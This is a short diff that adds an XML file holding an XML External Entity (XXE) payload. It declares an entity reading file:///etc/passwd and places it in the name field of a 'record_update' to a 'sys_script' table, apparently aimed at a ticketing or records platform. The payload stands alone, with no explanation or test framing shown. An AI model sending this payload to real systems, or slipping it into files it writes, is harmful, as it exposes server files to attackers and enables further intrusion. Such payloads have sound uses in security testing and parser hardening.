@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE record_update [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<record_update table="sys_script"><name>&xxe;</name></record_update>
